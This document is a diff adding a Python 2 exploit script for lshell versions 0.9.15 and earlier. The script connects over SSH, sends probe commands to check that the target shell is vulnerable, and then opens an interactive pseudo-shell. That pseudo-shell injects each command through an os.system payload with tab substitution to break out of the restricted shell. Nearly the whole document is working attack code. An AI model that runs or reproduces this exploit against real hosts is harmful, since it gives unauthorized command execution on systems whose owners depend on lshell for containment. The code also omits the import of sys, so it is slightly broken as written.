@@ -1,0 +1,86 @@
+import paramiko
+import traceback
+from time import sleep
+
+#
+# Exploit lshell pathing vulnerability in <= 0.9.15.
+# Runs commands on the remote system.
+# @dronesec
+#
+
+if len(sys.argv) < 4:
+    print '%s: [USER] [PW] [IP] {opt: port}'%(sys.argv[0])
+    sys.exit(1)
+
+try:
+    print '[!] .............................'
+    print '[!] lshell <= 0.9.15 remote shell.'
+    print '[!] note: you can also ssh in and execute \'/bin/bash\''
+    print '[!] .............................'
+    print '[!] Checking host %s...'%(sys.argv[3])
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+    if len(sys.argv) == 5:
+        ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
+    else:
+        ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])
+
+
+    # verify lshell 
+    channel = ssh.invoke_shell()
+    while not channel.recv_ready(): sleep(1)
+    ret = channel.recv(2048)
+
+    channel.send('help help\n')
+    while not channel.recv_ready(): sleep(1)
+    ret = channel.recv(2048)
+
+    if not 'lshell' in ret:
+        if 'forbidden' in ret:
+            print '[-] Looks like we can\'t execute SSH commands'
+        else:
+            print '[-] Environment is not lshell'
+        sys.exit(1)
+
+    # verify vulnerable version
+    channel.send('sudo\n')
+    while not channel.recv_ready(): sleep(1)
+    ret = channel.recv(2048)
+    if not 'Traceback' in ret:
+        print '[-] lshell version not vulnerable.'
+        sys.exit(1)
+    channel.close()
+    ssh.close()
+
+    # exec shell
+    print '[+] vulnerable lshell found, preparing pseudo-shell...'
+    if len(sys.argv) == 5:
+        ssh.connect(sys.argv[3],port=int(sys.argv[4]),username=sys.argv[1],password=sys.argv[2])
+    else:
+        ssh.connect(sys.argv[3],username=sys.argv[1],password=sys.argv[2])
+
+    while True:
+        cmd = raw_input('$ ')
+
+        # breaks paramiko
+        if cmd[0] is '/':
+            print '[!] Running binaries won\'t work!'
+            continue
+
+        cmd = cmd.replace("'", r"\'")
+        cmd = 'echo __import__(\'os\').system(\'%s\')'%(cmd.replace(' ',r'\t'))
+        if len(cmd) > 1:
+            if 'quit' in cmd or 'exit' in cmd:
+                break
+            (stdin,stdout,stderr) = ssh.exec_command(cmd)
+        out = stdout.read()
+        print out.strip()
+except paramiko.AuthenticationException:
+    print '[-] Authentication to %s failed.'%sys.argv[3]
+except Exception, e:
+    print '[-] Error: ', e
+    print type(e)
+    traceback.print_exc(file=sys.stdout)
+finally:
+    channel.close()
+    ssh.close()
